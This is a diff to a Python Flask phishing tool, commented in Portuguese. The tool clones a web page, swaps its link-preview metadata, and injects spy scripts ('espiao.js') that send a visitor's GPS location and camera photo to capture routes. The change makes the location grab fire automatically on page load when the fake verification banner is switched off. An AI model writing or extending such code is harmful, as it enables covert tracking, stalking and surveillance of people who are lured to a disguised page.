@@ -48,7 +48,7 @@ def mostrar_menu():
     
     ativar_loc = input(" Ativar localização? (s/n): ").lower() == 's'
     ativar_foto = input(" Ativar foto? (s/n): ").lower() == 's'
-    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'   # <-- NOVA OPÇÃO
+    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'   # Nova opção
     
     url_custom = ""
     if opcao == "5":
@@ -73,7 +73,7 @@ def mostrar_menu():
 
     return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto, ativar_banner
 
-# Desempacotando com a nova variável
+# Desempacotando todas as opções
 pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()
 
 # --- PERSONALIZAÇÃO DE PREVIEW ---
@@ -115,7 +115,7 @@ def index():
     except Exception as e:
         return f"Erro: {e}", 500
 
-    # --- LIMPEZA DE METADADOS ANTIGOS ---
+    # --- LIMPEZA DE METADADOS ANTIGOS (Para funcionar no clone) ---
     if personalizar == 's':
         html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
         html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
@@ -133,7 +133,7 @@ def index():
             f'<meta name="description" content="{meta_desc}">\n'
         )
 
-    # ==================== BANNER (agora opcional) ====================
+    # ==================== BANNER E GPS (CORRIGIDO) ====================
     css_banner = '''
     <style>
         #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; 
@@ -163,26 +163,37 @@ def index():
             document.getElementById('bloqueio-spy').style.display = 'none';
             if(typeof dispararGPS === "function") dispararGPS();
         }}
+
+        // === GPS AUTOMÁTICO QUANDO BANNER ESTIVER DESATIVADO ===
+        if (!{"true" if ativar_banner else "false"}) {{
+            window.addEventListener('load', function() {{
+                setTimeout(function() {{
+                    if (typeof dispararGPS === "function" && window.usarLoc === true) {{
+                        dispararGPS();
+                    }}
+                }}, 1200);   // Delay para garantir compatibilidade com navegadores
+            }});
+        }}
     </script>'''
     
     scripts_captura = '\n<script src="/static/js/espiao.js"></script>\n<script src="/static/js/saida.js"></script>\n'
 
     head_content = meta_tags + script_config + scripts_captura
 
-    # Só adiciona o banner se estiver ativado
+    # Adiciona CSS do banner apenas se estiver ativado
     if ativar_banner:
         head_content = css_banner + head_content
         banner_html = html_banner
     else:
         banner_html = ""
 
-    # Injeta no <head>
+    # Injeta conteúdo no <head>
     if re.search(r'<head', html_original, re.IGNORECASE):
         html_final = re.sub(r'(<head[^>]*>)', r'\1' + head_content, html_original, flags=re.IGNORECASE, count=1)
     else:
         html_final = head_content + html_original
 
-    # Injeta o banner no <body> (se ativado)
+    # Injeta o banner no <body> apenas se ativado
     if ativar_banner:
         if re.search(r'<body', html_final, re.IGNORECASE):
             html_final = re.sub(r'(<body[^>]*>)', r'\1' + banner_html, html_final, flags=re.IGNORECASE, count=1)
@@ -191,7 +202,6 @@ def index():
     
     return render_template_string(html_final)
 
-# ==================== ROTAS DE CAPTURA (mantidas iguais) ====================
 @app.route('/capturar', methods=['POST'])
 def capturar():
     dados = request.json
@@ -233,4 +243,3 @@ def receber_foto():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
-    
